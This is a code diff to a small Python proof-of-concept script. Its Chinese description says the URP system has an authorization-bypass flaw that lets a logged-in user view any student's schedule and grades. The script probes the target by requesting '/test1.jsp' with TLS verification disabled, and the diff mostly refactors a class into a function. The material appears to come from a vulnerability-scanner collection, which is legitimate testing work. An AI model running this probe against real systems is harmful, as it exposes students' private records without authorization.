@@ -9,17 +9,10 @@ description: 系统存在一个越权漏洞，登录之后可以通过姓名或�
 import sys
 import requests
 import warnings
-
-
-
-class query2:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['URP越权查看任意学生课表、成绩(需登录)','','']
         payload = "/test1.jsp"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,5 @@ class query2:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = query2(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
